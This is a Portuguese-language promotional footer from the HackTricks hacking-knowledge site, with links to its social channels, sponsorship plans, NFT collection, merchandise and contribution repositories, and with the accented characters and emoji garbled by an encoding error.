<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
